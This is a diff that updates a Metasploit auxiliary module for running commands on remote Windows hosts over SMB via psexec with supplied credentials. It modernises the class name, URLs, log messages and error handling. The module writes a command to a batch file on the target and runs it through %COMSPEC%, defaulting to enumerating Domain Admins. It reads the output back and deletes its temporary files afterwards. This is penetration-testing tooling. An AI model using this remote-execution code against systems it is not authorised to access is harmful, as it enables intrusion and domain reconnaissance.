@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client::Psexec
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -35,7 +32,7 @@ class Metasploit3 < Msf::Auxiliary
       'References'     => [
         [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
         [ 'OSVDB', '3106'],
-        [ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ],
+        [ 'URL', 'https://www.optiv.com/blog/owning-computers-without-shell-access' ],
         [ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
         [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
       ]
@@ -46,13 +43,13 @@ class Metasploit3 < Msf::Auxiliary
       OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
       OptString.new('RPORT', [true, 'The Target port', 445]),
       OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),
-    ], self.class)
+    ])
 
     register_advanced_options([
       OptString.new('FILEPREFIX', [false, 'Add a custom prefix to the temporary files','']),
       OptInt.new('DELAY', [true, 'Wait this many seconds before reading output and cleaning up', 0]),
       OptInt.new('RETRY', [true, 'Retry this many times to check if the process is complete', 0]),
-    ], self.class)
+    ])
 
     deregister_options('RHOST')
   end
@@ -69,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
       begin
         smb_login
       rescue Rex::Proto::SMB::Exceptions::Error => autherror
-        print_error("#{peer} - Unable to authenticate with given credentials: #{autherror}")
+        print_error("Unable to authenticate with given credentials: #{autherror}")
         return
       end
       res = execute_command(text, bat)
@@ -96,31 +93,31 @@ class Metasploit3 < Msf::Auxiliary
   def execute_command(text, bat)
     # Try and execute the provided command
     execute = "%COMSPEC% /C echo #{datastore['COMMAND']} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
-    print_status("#{peer} - Executing the command...")
+    print_status("Executing the command...")
     begin
       return psexec(execute)
-    rescue Rex::Proto::DCERPC::Exceptions::Error, Rex::Proto::SMB::Exceptions::Error => exec_command_error
+    rescue Rex::Proto::DCERPC::Exceptions::Error, Rex::Proto::SMB::Exceptions::Error => e
       elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}", 'rex', LEV_3)
-      print_error("#{peer} - Unable to execute specified command: #{exec_command_error}")
+      print_error("Unable to execute specified command: #{e}")
       return false
     end
   end
 
   # Retrive output from command
   def get_output(file)
-    print_status("#{peer} - Getting the command output...")
+    print_status("Getting the command output...")
     output = smb_read_file(@smbshare, @ip, file)
     if output.nil?
-      print_error("#{peer} - Error getting command output. #{$!.class}. #{$!}.")
+      print_error("Error getting command output. #{$!.class}. #{$!}.")
       return
     end
     if output.empty?
-      print_status("#{peer} - Command finished with no output")
+      print_status("Command finished with no output")
       return
     end
 
     # Report output
-    print_good("#{peer} - Command completed successfuly!")
+    print_good("Command completed successfuly!")
     vprint_status("Output for \"#{datastore['COMMAND']}\":")
     vprint_line("#{output}")
 
@@ -136,14 +133,19 @@ class Metasploit3 < Msf::Auxiliary
 
   # check if our process is done using these files
   def exclusive_access(*files)
+    begin
       simple.connect("\\\\#{@ip}\\#{@smbshare}")
-      files.each do |file|
+    rescue Rex::Proto::SMB::Exceptions::ErrorCode => accesserror
+      print_status("Unable to get handle: #{accesserror}")
+      return false
+    end
+    files.each do |file|
       begin
         print_status("checking if the file is unlocked")
         fd = smb_open(file, 'rwo')
         fd.close
       rescue Rex::Proto::SMB::Exceptions::ErrorCode => accesserror
-        print_status("#{peer} - Unable to get handle: #{accesserror}")
+        print_status("Unable to get handle: #{accesserror}")
         return false
       end
       simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
@@ -154,21 +156,25 @@ class Metasploit3 < Msf::Auxiliary
 
   # Removes files created during execution.
   def cleanup_after(*files)
-    simple.connect("\\\\#{@ip}\\#{@smbshare}")
-    print_status("#{peer} - Executing cleanup...")
+    begin
+      simple.connect("\\\\#{@ip}\\#{@smbshare}")
+    rescue Rex::Proto::SMB::Exceptions::ErrorCode => accesserror
+      print_error("Unable to connect for cleanup: #{accesserror}. Maybe you'll need to manually remove #{files.join(", ")} from the target.")
+      return
+    end
+    print_status("Executing cleanup...")
     files.each do |file|
       begin
         smb_file_rm(file)
       rescue Rex::Proto::SMB::Exceptions::ErrorCode => cleanuperror
-        print_error("#{peer} - Unable to cleanup #{file}. Error: #{cleanuperror}")
+        print_error("Unable to cleanup #{file}. Error: #{cleanuperror}")
       end
     end
     left = files.collect{ |f| smb_file_exist?(f) }
     if left.any?
-      print_error("#{peer} - Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
+      print_error("Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
     else
-      print_status("#{peer} - Cleanup was successful")
+      print_good("Cleanup was successful")
     end
   end
-
 end
